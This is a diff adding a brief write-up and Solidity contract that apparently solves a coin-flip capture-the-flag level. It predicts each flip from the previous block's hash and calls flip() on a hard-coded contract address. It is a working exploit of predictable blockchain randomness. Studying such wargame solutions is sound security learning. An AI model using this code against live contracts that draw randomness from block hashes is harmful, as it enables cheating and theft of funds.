@@ -1,0 +1,34 @@
+my contract use the original contract as an interface to calculate
+the right value for the coin to flip and send it to the flip() contract function
+
+pragma solidity ^0.4.18;
+
+contract CoinFlip {
+  function flip(bool _guess) public returns (bool){}
+}
+
+contract CoinFlipHackAnswer{
+    uint256 lastHashHack;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    CoinFlip cfInstance = CoinFlip(0xeE89316885f80738eD39ce93a7c8DA645EB61e2b);
+    function answer() public returns(bool) {
+        uint256 blockValue = uint256(block.blockhash(block.number-1));
+        lastHashHack = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        cfInstance.flip(side);
+        return (side);
+    }  
+
+    function () public payable {
+
+    }
+}
+
+just need to send send weit to the contract to make him able to use gas
+I deployed my contract on remix and run my answer() function
+
+
+
+
